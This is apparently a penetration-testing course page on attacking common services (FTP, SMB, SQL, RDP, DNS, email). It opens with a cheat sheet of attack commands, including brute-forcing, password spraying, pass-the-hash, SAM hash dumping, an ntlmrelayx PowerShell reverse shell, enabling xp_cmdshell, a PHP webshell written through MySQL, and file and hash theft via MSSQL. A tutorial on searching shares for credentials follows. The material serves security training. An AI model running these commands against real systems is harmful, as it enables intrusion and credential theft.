
<body>
  <div class="container">
<link rel="stylesheet" href="style.css">


<h1 id="9-attacking-common-services">9. Attacking Common Services</h1>
<h2 id="-cheat-sheet-"><strong>Cheat Sheet</strong></h2>
<p>The cheat sheet is a useful command reference for this module.</p>
<h3 id="attacking-ftp">Attacking FTP</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ftp 192.168.2.142</code></td>
<td>Connecting to the FTP server using the <code>ftp</code> client.</td>
</tr>
<tr>
<td><code>nc -v 192.168.2.142 21</code></td>
<td>Connecting to the FTP server using <code>netcat</code>.</td>
</tr>
<tr>
<td><code>hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142</code></td>
<td>Brute-forcing the FTP service.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="attacking-smb">Attacking SMB</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>smbclient -N -L //10.129.14.128</code></td>
<td>Null-session testing against the SMB service.</td>
</tr>
<tr>
<td><code>smbmap -H 10.129.14.128</code></td>
<td>Network share enumeration using <code>smbmap</code>.</td>
</tr>
<tr>
<td><code>smbmap -H 10.129.14.128 -r notes</code></td>
<td>Recursive network share enumeration using <code>smbmap</code>.</td>
</tr>
<tr>
<td><code>smbmap -H 10.129.14.128 --download &quot;notes\note.txt&quot;</code></td>
<td>Download a specific file from the shared folder.</td>
</tr>
<tr>
<td><code>smbmap -H 10.129.14.128 --upload test.txt &quot;notes\test.txt&quot;</code></td>
<td>Upload a specific file to the shared folder.</td>
</tr>
<tr>
<td><code>rpcclient -U&#39;%&#39; 10.10.110.17</code></td>
<td>Null-session with the <code>rpcclient</code>.</td>
</tr>
<tr>
<td><code>./enum4linux-ng.py 10.10.11.45 -A -C</code></td>
<td>Automated enumeratition of the SMB service using <code>enum4linux-ng</code>.</td>
</tr>
<tr>
<td><code>crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p &#39;Company01!&#39;</code></td>
<td>Password spraying against different users from a list.</td>
</tr>
<tr>
<td><code>impacket-psexec administrator:&#39;Password123!&#39;@10.10.110.17</code></td>
<td>Connect to the SMB service using the <code>impacket-psexec</code>.</td>
</tr>
<tr>
<td><code>crackmapexec smb 10.10.110.17 -u Administrator -p &#39;Password123!&#39; -x &#39;whoami&#39; --exec-method smbexec</code></td>
<td>Execute a command over the SMB service using <code>crackmapexec</code>.</td>
</tr>
<tr>
<td><code>crackmapexec smb 10.10.110.0/24 -u administrator -p &#39;Password123!&#39; --loggedon-users</code></td>
<td>Enumerating Logged-on users.</td>
</tr>
<tr>
<td><code>crackmapexec smb 10.10.110.17 -u administrator -p &#39;Password123!&#39; --sam</code></td>
<td>Extract hashes from the SAM database.</td>
</tr>
<tr>
<td><code>crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></td>
<td>Use the Pass-The-Hash technique to authenticate on the target host.</td>
</tr>
<tr>
<td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code></td>
<td>Dump the SAM database using <code>impacket-ntlmrelayx</code>.</td>
</tr>
<tr>
<td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c &#39;powershell -e &lt;base64 reverse shell&gt;</code></td>
<td>Execute a PowerShell based reverse shell using <code>impacket-ntlmrelayx</code>.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="attacking-sql-databases">Attacking SQL Databases</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>mysql -u julio -pPassword123 -h 10.129.20.13</code></td>
<td>Connecting to the MySQL server.</td>
</tr>
<tr>
<td><code>sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P &#39;MyPassword!&#39; -y 30 -Y 30</code></td>
<td>Connecting to the MSSQL server.</td>
</tr>
<tr>
<td><code>sqsh -S 10.129.203.7 -U julio -P &#39;MyPassword!&#39; -h</code></td>
<td>Connecting to the MSSQL server from Linux.</td>
</tr>
<tr>
<td><code>sqsh -S 10.129.203.7 -U .\\julio -P &#39;MyPassword!&#39; -h</code></td>
<td>Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server.</td>
</tr>
<tr>
<td><code>mysql&gt; SHOW DATABASES;</code></td>
<td>Show all available databases in MySQL.</td>
</tr>
<tr>
<td><code>mysql&gt; USE htbusers;</code></td>
<td>Select a specific database in MySQL.</td>
</tr>
<tr>
<td><code>mysql&gt; SHOW TABLES;</code></td>
<td>Show all available tables in the selected database in MySQL.</td>
</tr>
<tr>
<td><code>mysql&gt; SELECT * FROM users;</code></td>
<td>Select all available entries from the &quot;users&quot; table in MySQL.</td>
</tr>
<tr>
<td><code>sqlcmd&gt; SELECT name FROM master.dbo.sysdatabases</code></td>
<td>Show all available databases in MSSQL.</td>
</tr>
<tr>
<td><code>sqlcmd&gt; USE htbusers</code></td>
<td>Select a specific database in MSSQL.</td>
</tr>
<tr>
<td><code>sqlcmd&gt; SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES</code></td>
<td>Show all available tables in the selected database in MSSQL.</td>
</tr>
<tr>
<td><code>sqlcmd&gt; SELECT * FROM users</code></td>
<td>Select all available entries from the &quot;users&quot; table in MSSQL.</td>
</tr>
<tr>
<td><code>sqlcmd&gt; EXECUTE sp_configure &#39;show advanced options&#39;, 1</code></td>
<td>To allow advanced options to be changed.</td>
</tr>
<tr>
<td><code>sqlcmd&gt; EXECUTE sp_configure &#39;xp_cmdshell&#39;, 1</code></td>
<td>To enable the xp_cmdshell.</td>
</tr>
<tr>
<td><code>sqlcmd&gt; RECONFIGURE</code></td>
<td>To be used after each sp_configure command to apply the changes.</td>
</tr>
<tr>
<td><code>sqlcmd&gt; xp_cmdshell &#39;whoami&#39;</code></td>
<td>Execute a system command from MSSQL server.</td>
</tr>
<tr>
<td><code>mysql&gt; SELECT &quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot; INTO OUTFILE &#39;/var/www/html/webshell.php&#39;</code></td>
<td>Create a file using MySQL.</td>
</tr>
<tr>
<td><code>mysql&gt; show variables like &quot;secure_file_priv&quot;;</code></td>
<td>Check if the the secure file privileges are empty to read locally stored files on the system.</td>
</tr>
<tr>
<td><code>sqlcmd&gt; SELECT * FROM OPENROWSET(BULK N&#39;C:/Windows/System32/drivers/etc/hosts&#39;, SINGLE_CLOB) AS Contents</code></td>
<td>Read local files in MSSQL.</td>
</tr>
<tr>
<td><code>mysql&gt; select LOAD_FILE(&quot;/etc/passwd&quot;);</code></td>
<td>Read local files in MySQL.</td>
</tr>
<tr>
<td><code>sqlcmd&gt; EXEC master..xp_dirtree &#39;\\10.10.110.17\share\&#39;</code></td>
<td>Hash stealing using the <code>xp_dirtree</code> command in MSSQL.</td>
</tr>
<tr>
<td><code>sqlcmd&gt; EXEC master..xp_subdirs &#39;\\10.10.110.17\share\&#39;</code></td>
<td>Hash stealing using the <code>xp_subdirs</code> command in MSSQL.</td>
</tr>
<tr>
<td><code>sqlcmd&gt; SELECT srvname, isremote FROM sysservers</code></td>
<td>Identify linked servers in MSSQL.</td>
</tr>
<tr>
<td><code>sqlcmd&gt; EXECUTE(&#39;select @@servername, @@version, system_user, is_srvrolemember(&#39;&#39;sysadmin&#39;&#39;)&#39;) AT [10.0.0.12\SQLEXPRESS]</code></td>
<td>Identify the user and its privileges used for the remote connection in MSSQL.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="attacking-rdp">Attacking RDP</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c &#39;password123&#39;</code></td>
<td>Password spraying against the RDP service.</td>
</tr>
<tr>
<td><code>hydra -L usernames.txt -p &#39;password123&#39; 192.168.2.143 rdp</code></td>
<td>Brute-forcing the RDP service.</td>
</tr>
<tr>
<td><code>rdesktop -u admin -p password123 192.168.2.143</code></td>
<td>Connect to the RDP service using <code>rdesktop</code> in Linux.</td>
</tr>
<tr>
<td><code>tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}</code></td>
<td>Impersonate a user without its password.</td>
</tr>
<tr>
<td><code>net start sessionhijack</code></td>
<td>Execute the RDP session hijack.</td>
</tr>
<tr>
<td><code>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></td>
<td>Enable &quot;Restricted Admin Mode&quot; on the target Windows host.</td>
</tr>
<tr>
<td><code>xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA</code></td>
<td>Use the Pass-The-Hash technique to login on the target host without a password.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="attacking-dns">Attacking DNS</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>dig AXFR @ns1.inlanefreight.htb inlanefreight.htb</code></td>
<td>Perform an AXFR zone transfer attempt against a specific name server.</td>
</tr>
<tr>
<td><code>subfinder -d inlanefreight.com -v</code></td>
<td>Brute-forcing subdomains.</td>
</tr>
<tr>
<td><code>host support.inlanefreight.com</code></td>
<td>DNS lookup for the specified subdomain.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="attacking-email-services">Attacking Email Services</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>host -t MX microsoft.com</code></td>
<td>DNS lookup for mail servers for the specified domain.</td>
</tr>
<tr>
<td>`dig mx inlanefreight.com \</td>
<td>grep &quot;MX&quot; \</td>
<td>grep -v &quot;;&quot;`</td>
<td>DNS lookup for mail servers for the specified domain.</td>
</tr>
<tr>
<td><code>host -t A mail1.inlanefreight.htb.</code></td>
<td>DNS lookup of the IPv4 address for the specified subdomain.</td>
</tr>
<tr>
<td><code>telnet 10.10.110.20 25</code></td>
<td>Connect to the SMTP server.</td>
</tr>
<tr>
<td><code>smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</code></td>
<td>SMTP user enumeration using the RCPT command against the specified host.</td>
</tr>
<tr>
<td><code>python3 o365spray.py --validate --domain msplaintext.xyz</code></td>
<td>Verify the usage of Office365 for the specified domain.</td>
</tr>
<tr>
<td><code>python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz</code></td>
<td>Enumerate existing users using Office365 on the specified domain.</td>
</tr>
<tr>
<td><code>python3 o365spray.py --spray -U usersfound.txt -p &#39;March2022!&#39; --count 1 --lockout 1 --domain msplaintext.xyz</code></td>
<td>Password spraying against a list of users that use Office365 for the specified domain.</td>
</tr>
<tr>
<td><code>hydra -L users.txt -p &#39;Company01!&#39; -f 10.10.110.20 pop3</code></td>
<td>Brute-forcing the POP3 service.</td>
</tr>
<tr>
<td><code>swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header &#39;Subject: Notification&#39; --body &#39;Message&#39; --server 10.10.11.213</code></td>
<td>Testing the SMTP service for the open-relay vulnerability.</td>
</tr>
</tbody>
</table>
<h2 id="interacting-with-common-services">Interacting with Common Services</h2>
<hr>
<p>Vulnerabilities are commonly discovered by people who use and understand technology, a protocol, or a service. As we evolve in this field, we will find different services to interact with, and we will need to evolve and learn new technology constantly.</p>
<p>To be successful at attacking a service, we need to know its purpose, how to interact with it, what tools we can use, and what we can do with it. This section will focus on common services and how we can interact with them.</p>
<hr>
<h3 id="file-share-services">File Share Services</h3>
<p>A file sharing service is a type of service that provides, mediates, and monitors the transfer of computer files. Years ago, businesses commonly used only internal services for file sharing, such as SMB, NFS, FTP, TFTP, SFTP, but as cloud adoption grows, most companies now also have third-party cloud services such as Dropbox, Google Drive, OneDrive, SharePoint, or other forms of file storage such as AWS S3, Azure Blob Storage, or Google Cloud Storage. We will be exposed to a mixture of internal and external file-sharing services, and we need to be familiar with them.</p>
<p>This section will focus on internal services, but this may apply to cloud storage synced locally to servers and workstations.</p>
<hr>
<h3 id="server-message-block-smb-">Server Message Block (SMB)</h3>
<p>SMB is commonly used in Windows networks, and we will often find share folders in a Windows network. We can interact with SMB using the GUI, CLI, or tools. Let us cover some common ways of interacting with SMB using Windows &amp; Linux.</p>
<p><strong>Windows</strong></p>
<p>There are different ways we can interact with a shared folder using Windows, and we will explore a couple of them. On Windows GUI, we can press <code>[WINKEY] + [R]</code> to open the Run dialog box and type the file share location, e.g.: <code>\\192.168.220.129\Finance\</code></p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/windows\_run\_sharefolder2.jpg" alt="text"></p>
<p>Suppose the shared folder allows anonymous authentication, or we are authenticated with a user who has privilege over that shared folder. In that case, we will not receive any form of authentication request, and it will display the content of the shared folder.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/finance\_share\_folder2.jpg" alt="image"></p>
<p>If we do not have access, we will receive an authentication request.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/auth\_request\_share\_folder2.jpg" alt="text"></p>
<p>Windows has two command-line shells: the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands">Command shell</a> and <a href="https://docs.microsoft.com/en-us/powershell/scripting/overview">PowerShell</a>. Each shell is a software program that provides direct communication between us and the operating system or application, providing an environment to automate IT operations.</p>
<p>Let&#39;s discuss some commands to interact with file share using Command Shell (<code>CMD</code>) and <code>PowerShell</code>. The command <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dir">dir</a> displays a list of a directory&#39;s files and subdirectories.</p>
<p><strong>Windows CMD - DIR</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-string">\htb&gt;</span> dir <span class="hljs-string">\\192.168.220.129\Finance\</span>

Volume <span class="hljs-keyword">in</span> drive <span class="hljs-string">\\192.168.220.129\Finance</span> has <span class="hljs-literal">no</span> label.
Volume Serial Number <span class="hljs-keyword">is</span> ABCD-EFAA

Directory <span class="hljs-keyword">of</span> <span class="hljs-string">\\192.168.220.129\Finance</span>

<span class="hljs-number">02</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">11</span>:<span class="hljs-number">35</span> AM    &lt;DIR&gt;          Contracts
               <span class="hljs-number">0</span> File(s)          <span class="hljs-number">4</span>,<span class="hljs-number">096</span> bytes
               <span class="hljs-number">1</span> Dir(s)  <span class="hljs-number">15</span>,<span class="hljs-number">207</span>,<span class="hljs-number">469</span>,<span class="hljs-number">056</span> bytes free
</code></pre>
<p>The command <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155\(v=ws.11\">net use</a>) connects a computer to or disconnects a computer from a shared resource or displays information about computer connections. We can connect to a file share with the following command and map its content to the drive letter <code>n</code>.</p>
<p><strong>Windows CMD - Net Use</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">net</span> <span class="hljs-selector-tag">use</span> <span class="hljs-selector-tag">n</span>: \\192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.220</span><span class="hljs-selector-class">.129</span>\<span class="hljs-selector-tag">Finance</span>

<span class="hljs-selector-tag">The</span> <span class="hljs-selector-tag">command</span> <span class="hljs-selector-tag">completed</span> <span class="hljs-selector-tag">successfully</span>.
</code></pre>
<p>We can also provide a username and password to authenticate to the share.</p>
<p>Interacting with Common Services</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt; net use <span class="hljs-string">n:</span> \\<span class="hljs-number">192.168</span><span class="hljs-number">.220</span><span class="hljs-number">.129</span>\Finance /<span class="hljs-string">user:</span>plaintext Password123

The command completed successfully.
</code></pre>
<p>With the shared folder mapped as the <code>n</code> drive, we can execute Windows commands as if this shared folder is on our local computer. Let&#39;s find how many files the shared folder and its subdirectories contain.</p>
<p><strong>Windows CMD - DIR</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\htb&gt; dir <span class="hljs-attribute">n</span>: /a-d /s /b | find /c <span class="hljs-string">":\"</span>

<span class="hljs-number">29302</span>
</code></pre>
<p>We found 29,302 files. Let&#39;s walk through the command:</p>
<p>Interacting with Common Services</p>
<pre><code class="lang-shell-session">dir <span class="hljs-string">n:</span> <span class="hljs-regexp">/a-d /</span>s <span class="hljs-regexp">/b | find /</span>c <span class="hljs-string">":\"</span>
</code></pre>
<table>
<thead>
<tr>
<th><strong>Syntax</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>dir</code></td>
<td>Application</td>
</tr>
<tr>
<td><code>n:</code></td>
<td>Directory or drive to search</td>
</tr>
<tr>
<td><code>/a-d</code></td>
<td><code>/a</code> is the attribute and <code>-d</code> means not directories</td>
</tr>
<tr>
<td><code>/s</code></td>
<td>Displays files in a specified directory and all subdirectories</td>
</tr>
<tr>
<td><code>/b</code></td>
<td>Uses bare format (no heading information or summary)</td>
</tr>
</tbody>
</table>
<p>The following command <code>| find /c &quot;:\\&quot;</code> process the output of <code>dir n: /a-d /s /b</code> to count how many files exist in the directory and subdirectories. You can use <code>dir /?</code> to see the full help. Searching through 29,302 files is time consuming, scripting and command line utilities can help us speed up the search. With <code>dir</code> we can search for specific names in files such as:</p>
<ul>
<li>cred</li>
<li>password</li>
<li>users</li>
<li>secrets</li>
<li>key</li>
<li>Common File Extensions for source code such as: .cs, .c, .go, .java, .php, .asp, .aspx, .html.</li>
</ul>
<p>Interacting with Common Services</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt;dir n:<span class="hljs-symbol">\*</span>cred* /s /b

n:<span class="hljs-symbol">\C</span>ontracts<span class="hljs-symbol">\p</span>rivate<span class="hljs-symbol">\c</span>redentials.txt


C:<span class="hljs-symbol">\h</span>tb&gt;dir n:<span class="hljs-symbol">\*</span>secret* /s /b

n:<span class="hljs-symbol">\C</span>ontracts<span class="hljs-symbol">\p</span>rivate<span class="hljs-symbol">\s</span>ecret.txt
</code></pre>
<p>If we want to search for a specific word within a text file, we can use <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr">findstr</a>.</p>
<p><strong>Windows CMD - Findstr</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">c:</span>\htb&gt;findstr <span class="hljs-regexp">/s /</span>i cred <span class="hljs-string">n:</span>\*.*
<span class="hljs-symbol">
n:</span>\Contracts\<span class="hljs-keyword">private</span>\secret.<span class="hljs-string">txt:</span>file with all credentials
<span class="hljs-string">n:</span>\Contracts\<span class="hljs-keyword">private</span>\credentials.<span class="hljs-string">txt:</span><span class="hljs-string">admin:</span>SecureCredentials!
</code></pre>
<p>We can find more <code>findstr</code> examples <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr#examples">here</a>.</p>
<p><strong>Windows PowerShell</strong></p>
<p>PowerShell was designed to extend the capabilities of the Command shell to run PowerShell commands called <code>cmdlets</code>. Cmdlets are similar to Windows commands but provide a more extensible scripting language. We can run both Windows commands and PowerShell cmdlets in PowerShell, but the Command shell can only run Windows commands and not PowerShell cmdlets. Let&#39;s replicate the same commands now using Powershell.</p>
<p><strong>Windows PowerShell</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-tag">\<span class="hljs-name">htb</span></span>&gt; Get-ChildItem <span class="hljs-tag">\<span class="hljs-name">\</span></span>192.168.220.129<span class="hljs-tag">\<span class="hljs-name">Finance</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>
    Directory: <span class="hljs-tag">\<span class="hljs-name">\</span></span>192.168.220.129<span class="hljs-tag">\<span class="hljs-name">Finance</span></span>

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/23/2022   3:27 PM                Contracts
</code></pre>
<p>Instead of <code>net use</code>, we can use <code>New-PSDrive</code> in PowerShell.</p>
<p>Interacting with Common Services</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; New-PSDrive -Name <span class="hljs-string">"N"</span> -<span class="hljs-keyword">Root</span> <span class="hljs-string">"\\192.168.220.129\Finance"</span> -PSProvider <span class="hljs-string">"FileSystem"</span>

Name           Used (GB)     Free (GB) Provider      <span class="hljs-keyword">Root</span>                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
<span class="hljs-keyword">N</span>                                      FileSystem    \\<span class="hljs-number">192.168</span><span class="hljs-number">.220</span><span class="hljs-number">.129</span>\Finance
</code></pre>
<p>To provide a username and password with Powershell, we need to create a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential">PSCredential object</a>. It offers a centralized way to manage usernames, passwords, and credentials.</p>
<p><strong>Windows PowerShell - PSCredential Object</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; <span class="hljs-variable">$username</span> = <span class="hljs-string">'plaintext'</span>
PS C:\htb&gt; <span class="hljs-variable">$password</span> = <span class="hljs-string">'Password123'</span>
PS C:\htb&gt; <span class="hljs-variable">$secpassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force
PS C:\htb&gt; <span class="hljs-variable">$cred</span> = New-Object System<span class="hljs-selector-class">.Management</span><span class="hljs-selector-class">.Automation</span><span class="hljs-selector-class">.PSCredential</span> <span class="hljs-variable">$username</span>, <span class="hljs-variable">$secpassword</span>
PS C:\htb&gt; New-PSDrive -Name <span class="hljs-string">"N"</span> -Root <span class="hljs-string">"\\192.168.220.129\Finance"</span> -PSProvider <span class="hljs-string">"FileSystem"</span> -Credential <span class="hljs-variable">$cred</span>

Name           Used (GB)     Free (GB) Provider      Root                                                              CurrentLocation
----           ---------     --------- --------      ----                                                              ---------------
N                                      FileSystem    \\<span class="hljs-number">192.168</span>.<span class="hljs-number">220.129</span>\Finance
</code></pre>
<p>In PowerShell, we can use the command <code>Get-ChildItem</code> or the short variant <code>gci</code> instead of the command <code>dir</code>.</p>
<p><strong>Windows PowerShell - GCI</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">N</span>:
PS <span class="hljs-keyword">N</span>:\&gt; (<span class="hljs-keyword">Get</span>-ChildItem -<span class="hljs-keyword">File</span> -Recurse | Measure-Object).<span class="hljs-keyword">Count</span>

<span class="hljs-number">29302</span>
</code></pre>
<p>We can use the property <code>-Include</code> to find specific items from the directory specified by the Path parameter.</p>
<p>Interacting with Common Services</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">Get</span>-ChildItem -Recurse -<span class="hljs-keyword">Path</span> <span class="hljs-keyword">N</span>:\ -Include *cred* -<span class="hljs-keyword">File</span>

    <span class="hljs-keyword">Directory</span>: <span class="hljs-keyword">N</span>:\Contracts\private

<span class="hljs-keyword">Mode</span>                 LastWriteTime         <span class="hljs-keyword">Length</span> Name
----                 -------------         ------ ----
-a----         <span class="hljs-number">2</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">4</span>:<span class="hljs-number">36</span> PM             <span class="hljs-number">25</span> credentials.txt
</code></pre>
<p>The <code>Select-String</code> cmdlet uses regular expression matching to search for text patterns in input strings and files. We can use <code>Select-String</code> similar to <code>grep</code> in UNIX or <code>findstr.exe</code> in Windows.</p>
<p><strong>Windows PowerShell - Select-String</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">Get</span>-ChildItem -Recurse -<span class="hljs-keyword">Path</span> <span class="hljs-keyword">N</span>:\ | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">String</span> <span class="hljs-string">"cred"</span> -<span class="hljs-keyword">List</span>

<span class="hljs-keyword">N</span>:\Contracts\private\secret.txt:<span class="hljs-number">1</span>:file with all credentials
<span class="hljs-keyword">N</span>:\Contracts\private\credentials.txt:<span class="hljs-number">1</span>:admin:SecureCredentials!
</code></pre>
<p>CLI enables IT operations to automate routine tasks like user account management, nightly backups, or interaction with many files. We can perform operations more efficiently by using scripts than the user interface or GUI.</p>
<p><strong>Linux</strong></p>
<p>Linux (UNIX) machines can also be used to browse and mount SMB shares. Note that this can be done whether the target server is a Windows machine or a Samba server. Even though some Linux distributions support a GUI, we will focus on Linux command-line utilities and tools to interact with SMB. Let&#39;s cover how to mount SMB shares to interact with directories and files locally.</p>
<p><strong>Linux - Mount</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo mkdir /</span>mnt/Finance
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. /</span><span class="hljs-regexp">/192.168.220.129/</span>Finance <span class="hljs-regexp">/mnt/</span>Finance
</code></pre>
<p>As an alternative, we can use a credential file.</p>
<p>Interacting with Common Services</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ mount -t cifs /</span><span class="hljs-regexp">/192.168.220.129/</span>Finance <span class="hljs-regexp">/mnt/</span>Finance -o credentials=<span class="hljs-regexp">/path/</span>credentialfile
</code></pre>
<p>The file <code>credentialfile</code> has to be structured like this:</p>
<p><strong>CredentialFile</strong></p>
<p>Code: txt</p>
<pre><code class="lang-txt"><span class="hljs-attr">username</span>=plaintext
<span class="hljs-attr">password</span>=Password123
<span class="hljs-attr">domain</span>=.
</code></pre>
<p>Note: We need to install <code>cifs-utils</code> to connect to an SMB share folder. To install it we can execute from the command line <code>sudo apt install cifs-utils</code>.</p>
<p>Once a shared folder is mounted, you can use common Linux tools such as <code>find</code> or <code>grep</code> to interact with the file structure. Let&#39;s hunt for a filename that contains the string <code>cred</code>:</p>
<p><strong>Linux - Find</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ find /</span>mnt<span class="hljs-regexp">/Finance/</span> -name *cred*

<span class="hljs-regexp">/mnt/</span>Finance<span class="hljs-regexp">/Contracts/</span><span class="hljs-keyword">private</span>/credentials.txt
</code></pre>
<p>Next, let&#39;s find files that contain the string <code>cred</code>:</p>
<p>Interacting with Common Services</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ grep -rn /</span>mnt<span class="hljs-regexp">/Finance/</span> -ie cred

<span class="hljs-regexp">/mnt/</span>Finance<span class="hljs-regexp">/Contracts/</span><span class="hljs-keyword">private</span>/credentials.<span class="hljs-string">txt:</span><span class="hljs-number">1</span>:<span class="hljs-string">admin:</span>SecureCredentials!
<span class="hljs-regexp">/mnt/</span>Finance<span class="hljs-regexp">/Contracts/</span><span class="hljs-keyword">private</span>/secret.<span class="hljs-string">txt:</span><span class="hljs-number">1</span>:file with all credentials
</code></pre>
<hr>
<h3 id="other-services">Other Services</h3>
<p>There are other file-sharing services such as FTP, TFTP, and NFS that we can attach (mount) using different tools and commands. However, once we mount a file-sharing service, we must understand that we can use the available tools in Linux or Windows to interact with files and directories. As we discover new file-sharing services, we will need to investigate how they work and what tools we can use to interact with them.</p>
<p><strong>Email</strong></p>
<p>We typically need two protocols to send and receive messages, one for sending and another for receiving. The Simple Mail Transfer Protocol (SMTP) is an email delivery protocol used to send mail over the internet. Likewise, a supporting protocol must be used to retrieve an email from a service. There are two main protocols we can use POP3 and IMAP.</p>
<p>We can use a mail client such as <a href="https://wiki.gnome.org/Apps/Evolution">Evolution</a>, the official personal information manager, and mail client for the GNOME Desktop Environment. We can interact with an email server to send or receive messages with a mail client. To install Evolution, we can use the following command:</p>
<p><strong>Linux - Install Evolution</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo apt-get install evolution
...SNIP...
</code></pre>
<p>Note: If an error appears when starting evolution indicating &quot;bwrap: Can&#39;t create file at ...&quot;, use this command to start evolution <code>export WEBKIT_FORCE_SANDBOX=0 &amp;&amp; evolution</code>.</p>
<p><strong>Video - Connecting to IMAP and SMTP using Evolution</strong></p>
<p>Click on the image below to see a short video demonstration.</p>
<p><a href="https://www.youtube.com/watch?v=xelO2CiaSVs"><img src="https://academy.hackthebox.com/storage/modules/116/ConnectToIMAPandSMTP.jpg" alt="Evolution"></a></p>
<p>We can use the domain name or IP address of the mail server. If the server uses SMTPS or IMAPS, we&#39;ll need the appropriate encryption method (TLS on a dedicated port or STARTTLS after connecting). We can use the <code>Check for Supported Types</code> option under authentication to confirm if the server supports our selected method.</p>
<p><strong>Databases</strong></p>
<p>Databases are typically used in enterprises, and most companies use them to store and manage information. There are different types of databases, such as Hierarchical databases, NoSQL (or non-relational) databases, and SQL relational databases. We will focus on SQL relational databases and the two most common relational databases called MySQL &amp; MSSQL. We have three common ways to interact with databases:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>1.</code></td>
<td>Command Line Utilities (<code>mysql</code> or <code>sqsh</code>)</td>
</tr>
<tr>
<td><code>2.</code></td>
<td>A GUI application to interact with databases such as HeidiSQL, MySQL Workbench, or SQL Server Management Studio.</td>
